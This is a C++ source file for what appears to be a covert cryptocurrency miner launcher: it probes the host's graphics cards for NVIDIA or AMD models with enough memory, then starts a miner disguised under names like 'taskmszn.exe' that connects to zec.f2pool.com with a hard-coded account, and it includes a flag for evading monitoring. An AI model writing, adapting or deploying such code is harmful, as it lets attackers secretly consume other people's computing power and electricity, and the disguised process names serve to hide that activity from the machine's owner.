#include "stdafx.h"

#include "CheckEnvironment.h"
#include <Tlhelp32.h>
#include <shlwapi.h>
#pragma comment(lib,"shlwapi.lib")
#include "Utility/PeeIdHelper.h"
#include "commonshare\md5.h"
#include "Utility\StringOperation.h"
#include "userconfig.h"

//配置以下参数
/*
	g_bCheckName:是否检测显卡型号
	g_szCardName：显卡名称匹配（往后添加）
	g_uMinMemorySize：显存大小 根据需求修改
*/
bool g_bCheckName = CHECKCARD;
char g_szCardName[][MAX_PATH] = {"950","960","970","980","1050","1060","1070","1080","2050","2060","2070","2080", "titan xp", "titan v", "titan z", "titan x"};
cl_ulong g_uMinMemorySize = 2900000000;



bool RunEnvironment::CheckEnvironment()
{
	if (CheckZNCond())
	{
		m_Type = vendor_t::nvidia;
		return true;
	}
	else if (CheckZACond())
	{
		//m_Type = vendor_t::amd;
		//return true;
	}
	else if (CheckXCCond())
	{
		m_Type = vendor_t::cpu;
		return true;
	}
	return false;
}



void RunEnvironment::GetRunCmd(std::wstring &wstrCmd)
{
	TCHAR szExePath[MAX_PATH] = {0};
	GetModuleFileName(NULL, szExePath, MAX_PATH);
	PathRemoveFileSpec(szExePath);
	
	GetClientInfo();

	TCHAR szLaunchExe[MAX_PATH] = {0}; 
	PathCombine(szLaunchExe,szExePath,m_pClientInfo->strClientSubPath.c_str());

	if (::PathFileExists(szLaunchExe))
	{
		TCHAR szCmdLine[MAX_PATH] = {0};
		_sntprintf(szCmdLine, _MAX_PATH, L"%s %s", szLaunchExe,m_pClientInfo->strClientParam.c_str());
		wstrCmd = szCmdLine;
	}
}

std::wstring RunEnvironment::GetRandomAccount()
{
	int iAscii = GetStringAscii(m_wstrWorkID);
	TCHAR szAccountList[][MAX_PATH] = {
		ACCOUNT,
	};
	int index = iAscii%ARRAYSIZE(szAccountList);
	return szAccountList[index];
}

void RunEnvironment::GetWorkID()
{
	/*std::wstring wstrPeerID;
	GetPeerId_(wstrPeerID);

	std::string strPeerID = ultra::_T2A(wstrPeerID);
	wchar_t pszMD5[MAX_PATH] = {0};

	if (GetStringMd5(strPeerID,pszMD5) && wcslen(pszMD5) >= 8)
	{
		m_wstrWorkID = ultra::ToLower(std::wstring(pszMD5,8));
	}
	else
	{
		m_wstrWorkID = L"00000000";
	}*/
	m_wstrWorkID = USERID;  //    _/~拾忆
}  

void RunEnvironment::GetClientInfo()
{
	GetWorkID();
	std::wstring strFormat = L"";
	std::wstring strAccount = GetRandomAccount();
	std::wstring strWorkid = L"";
	m_pClientInfo = new CLIENT_INFO();
	if (m_Type == vendor_t::nvidia)
	{
		strFormat = L"--server zec.f2pool.com --user %s.%s --pass x --port 3357 --fee 0 --pec --intensity 1";
		//strWorkid = L"n0";
		m_pClientInfo->strClientSubPath = L"taskmszn\\taskmszn.exe";
	}
	else if (m_Type == vendor_t::amd)
	{
		strFormat = ZA_CMD;
		//strWorkid = L"a0";
		m_pClientInfo->strClientSubPath = L"taskmsza\\taskmsza.exe";
	}
	else if (m_Type == vendor_t::cpu)
	{
		strFormat = L"";
		m_pClientInfo->strClientSubPath = L"taskmsxc\\taskmsxc.exe";
	}
	TCHAR szParam[MAX_PATH] = {0};
	_sntprintf(szParam, _MAX_PATH, strFormat.c_str(), strAccount.c_str(),m_wstrWorkID.c_str());
	m_pClientInfo->strClientParam = szParam;
}


bool RunEnvironment::GetUserDisplayCardInfo(vector<DISPLAY_CARD_INFO> &vDISPLAY_CARD_INFO)
{
	if (LoadLibraryA("opencl32.dll") == NULL)
	{
		TSDEBUG4CXX("[GetUserDisplayCardInfo] load opencl fail, nErrorCode = "<< GetLastError());
		return false;  
	}

	GetDisplayCardInfo(vDISPLAY_CARD_INFO);
	return true;  
};

bool RunEnvironment::CheckZNCond()
{
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZNCond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::nvidia &&  iter->memory_size >= g_uMinMemorySize)
		{
			if (g_bCheckName)
			{
				return CheckGPUName(iter->name);
			}
			else
			{
				TSDEBUG4CXX(L"can do ZN with out check name , Name = " << iter->name.c_str());
				return true;
			}
			
		}
	}
	return false;
}


bool RunEnvironment::CheckZACond()
{
	vector<DISPLAY_CARD_INFO> vDISPLAY_CARD_INFO;
	if (!GetUserDisplayCardInfo(vDISPLAY_CARD_INFO))
	{
		return false;
	}
	for (std::vector<DISPLAY_CARD_INFO>::const_iterator iter = vDISPLAY_CARD_INFO.begin(); iter != vDISPLAY_CARD_INFO.end(); iter++) {
		TSDEBUG4CXX(L"[CheckZACond] Dispaly Card Info: name = "<< iter->name.c_str()<<L", vendor = "<<iter->vendor<<L", memory_size = "<<iter->memory_size);
		if (iter->vendor == vendor_t::amd &&  iter->memory_size >= g_uMinMemorySize)
		{
			if (g_bCheckName)
			{
				return CheckGPUName(iter->name);
			}
			else
			{
				TSDEBUG4CXX(L"can do ZA with out check name , Name = " << iter->name.c_str());
				return true;
			}
		}
	}
	return false;
}

bool RunEnvironment::CheckXCCond()
{
	return true;
}

bool RunEnvironment::CheckGPUName(const std::string &strName)
{
	std::string strCardName = strName;
	std::transform(strCardName.begin(), strCardName.end(), strCardName.begin(), tolower);

	for (int i = 0; i < ARRAYSIZE(g_szCardName); ++i)
	{
		if (strCardName.find(g_szCardName[i]) != std::string::npos)
		{
			TSDEBUG4CXX(L"can do z, Name = " << strCardName.c_str());
			return true;
		}
	}
	return false;
}

//void RunEnvironment::TerminateAllClientInstance()
//{
//	HANDLE hSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
//	if (hSnap != INVALID_HANDLE_VALUE)
//	{
//		PROCESSENTRY32 pe;
//		pe.dwSize = sizeof(PROCESSENTRY32);
//		BOOL bResult = ::Process32First(hSnap, &pe);
//		while (bResult)
//		{
//			if(	(_tcsicmp(pe.szExeFile, L"taskmszn.exe") == 0 && pe.th32ProcessID != 0)
//				|| (_tcsicmp(pe.szExeFile, L"taskmsza.exe") == 0 && pe.th32ProcessID != 0)
//				|| (_tcsicmp(pe.szExeFile, L"taskmsxc.exe") == 0 && pe.th32ProcessID != 0)
//				)
//			{
//				HANDLE hProcess = ::OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
//				::TerminateProcess(hProcess, 99);
//			}
//			bResult = ::Process32Next(hSnap, &pe);
//		}
//		::CloseHandle(hSnap);
//	}
//}

int RunEnvironment::GetStringAscii(const std::wstring& wstr)
{
	int sum = 0;
	for (int i = 0; i < wstr.length(); i++) {
		wchar_t c = wstr[i];
		sum += (int)c;
	}
	return sum;
}

bool RunEnvironment::CheckIsForceNotMonitor()
{
	return m_Type == vendor_t::cpu || NOT_MONITOR;
}